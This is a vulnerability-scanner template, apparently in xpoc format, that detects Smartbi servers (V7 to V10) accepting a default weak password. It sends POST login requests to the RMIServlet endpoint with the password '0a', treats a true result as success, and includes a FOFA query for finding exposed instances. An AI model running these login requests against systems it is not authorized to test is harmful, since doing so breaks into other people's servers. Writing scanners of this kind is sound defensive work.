id: smartbi-default-user-weakpass

info:
  name: Smartbi Default User Weak Password
  author: xpoc
  severity: high
  verified: false
  description: |
    FOFA: app="SMARTBI"
  solutions: "V7 <= Smartbi <= V10"
  reference:
    - https://stack.chaitin.com/techblog/detail?id=113
  tags: smartbi,weakpass
  created: 2023/06/23

rules:
  r0:
    request:
      method: POST
      path: /smartbi/vision/RMIServlet
      body: |
        className=UserService&methodName=loginFromDB&params=["{{value}}","0a"]
    expression: response.body.bcontains(b'"result":true')
  r1:
    request:
      method: POST
      path: /vision/RMIServlet
      body: |
        className=UserService&methodName=loginFromDB&params=["{{value}}","0a"]
    expression: response.body.bcontains(b'"result":true')
expression: r0() || r1()